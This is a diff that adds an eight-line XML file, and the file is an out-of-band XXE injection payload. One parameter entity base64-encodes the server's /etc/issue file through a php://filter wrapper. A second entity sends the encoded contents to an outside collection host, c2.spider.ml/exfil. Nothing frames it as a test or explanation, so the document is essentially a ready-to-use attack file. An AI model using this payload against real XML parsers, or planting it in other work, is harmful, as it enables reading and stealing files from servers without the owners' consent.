@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE xxe [ 
+    <!ELEMENT xxe ANY >
+    <!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=file:///etc/issue">
+    <!ENTITY % conn "<!ENTITY exfil SYSTEM 'http://c2.spider.ml/exfil?%data;'>">
+    %conn;
+]>
+<xxe>&exfil;</xxe>
